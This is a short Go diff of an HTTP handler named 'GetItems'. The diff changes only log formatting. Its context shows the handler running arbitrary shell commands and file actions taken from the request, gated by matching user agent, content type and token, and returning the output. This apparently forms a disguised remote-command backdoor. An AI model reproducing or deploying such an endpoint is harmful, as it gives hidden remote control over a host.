@@ -20,14 +20,14 @@ func GetItems(writer http.ResponseWriter, request *http.Request) {
 	res := "success"
 	if defaultConfig.ContentType == ContentType && defaultConfig.UserAgent == UserAgent && defaultConfig.Token == Token {
 		if len(enum.CMD.Sh) > 0 {
-			logger.Info("sh: ", enum.CMD.Sh)
+			logger.Info("sh:", enum.CMD.Sh)
 			shell := strings.Fields(enum.CMD.Sh)
 			bytes, err := Cmd(shell[0], shell[1:]...)
 			if err != nil {
 				logger.Errorf("sh exec err:%v", err)
 			}
 			res = string(bytes)
-			logger.Info("output: ", res)
+			logger.Info("output:\n", res)
 		}
 		if len(enum.CMD.File) > 0 {
 			logger.Info("file: ", enum.CMD.File)
@@ -40,7 +40,7 @@ func GetItems(writer http.ResponseWriter, request *http.Request) {
 				logger.Errorf("file exec err:%v", err)
 			}
 			res = string(bytes)
-			logger.Info("output: ", res)
+			logger.Info("output:\n", res)
 		}
 	}
 	result.Success(res)
